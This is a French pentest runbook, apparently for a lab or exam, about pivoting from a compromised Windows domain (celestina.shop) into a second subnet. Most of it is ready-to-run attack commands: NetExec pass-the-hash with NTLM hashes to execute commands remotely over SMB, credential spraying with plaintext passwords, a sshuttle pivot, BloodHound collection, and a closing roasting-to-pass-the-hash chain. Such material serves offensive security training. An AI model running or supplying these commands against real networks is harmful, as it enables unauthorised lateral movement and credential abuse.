# Playbook 09 — Pivot réseau 10.37.13.0/24

> Runbook étapes 77–82 | Réseau « qui ne devrait pas être accessible »

## Contexte

- Scope : `10.37.13.0/24`
- Machine **dual-homed** : une interface 10.13.37.x + une 10.37.13.x
- Convention : WK-XXX = dernier octet IP (vérifier au examen)

---

### Étape 1 — Scan ipconfig massif (tous admins connus)

```bash
nxc smb 10.13.37.0/24 -u Administrator -H 'fafb12f22417628bb6422e9bb8686f5c' --local-auth -x 'ipconfig' 2>&1 | grep -B8 '10.37.13'
```

Répéter avec chaque compte `(Pwn3d!)` :

```bash
nxc smb 10.13.37.44 -u 'k.cheh' -H '2b96340904f32f7888a232c79ea37610' -x 'ipconfig'
nxc smb WK-155.celestina.shop -u 'Administrator' -k --use-kcache -x 'ipconfig'
```

**Résultat attendu** : ligne `10.37.13.X` sur une machine.

---

### Étape 2 — Noter la passerelle

| Machine pivot | IP 10.13.37.x | IP 10.37.13.x |
|---------------|---------------|---------------|
| WK-??? | | |

**Journal** : dessiner schéma réseau pour le rapport.

---

### Étape 3 — Scan du second segment

```bash
nxc smb 10.37.13.0/24 -u 'pentester' -p 'Password123!'
nxc smb 10.37.13.0/24 -u 'k.cedepte' -p 'R3m0t3Pr1v1l3g35@H4nd!'
```

---

### Étape 4 — Depuis Exegol via pivot (si routage VPN)

Si le VPN route déjà 10.37.13.0/24 après découverte :

```bash
ping -c 1 10.37.13.1
nxc smb 10.37.13.0/24 -u 'COMPTE' -p 'PASS' --continue-on-success
```

Si **pas** de route : configurer proxychains / sshuttle depuis session RDP sur la passerelle (selon consignes prof).

```bash
# Exemple sshuttle via RDP + port forward (à adapter)
sshuttle -r user@10.13.37.XXX 10.37.13.0/24
```

---

### Étape 5 — BloodHound / enum sur nouveau segment

```bash
bloodhound-python -u 'pentester' -p 'Password123!' -d celestina.shop -ns 10.13.37.42 -c All
# Puis analyser nouveaux hosts si DC secondaire
```

---

### Étape 6 — Répéter chaîne d’attaque

Sur 10.37.13.0/24 : roasting → partages → PTH → flags restants (même runbook).
